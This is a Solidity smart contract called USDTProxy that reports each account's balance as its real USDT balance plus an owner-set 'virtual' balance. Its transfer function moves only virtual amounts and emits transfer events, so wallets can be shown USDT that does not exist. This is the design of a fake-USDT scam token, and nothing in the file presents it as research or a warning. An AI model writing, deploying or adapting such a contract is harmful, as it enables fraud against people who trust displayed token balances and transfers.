// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/IUSDT.sol";

contract USDTProxy is Ownable {
    IUSDT public USDT;
    mapping(address => uint256) public virtualBalances;
    mapping(address => mapping(address => uint256)) public virtualAllowances;
    
    event VirtualTransfer(address indexed from, address indexed to, uint256 value);
    event VirtualApproval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(address initialOwner) Ownable(initialOwner) {}

    function setUSDT(address _USDT) external onlyOwner {
        USDT = IUSDT(_USDT);
    }

    function setVirtualBalance(address account, uint256 amount) external onlyOwner {
        virtualBalances[account] = amount;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return virtualBalances[account] + USDT.balanceOf(account);
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        virtualBalances[msg.sender] -= amount;
        virtualBalances[to] += amount;
        emit VirtualTransfer(msg.sender, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        virtualAllowances[msg.sender][spender] = amount;
        emit VirtualApproval(msg.sender, spender, amount);
        return true;
    }
} 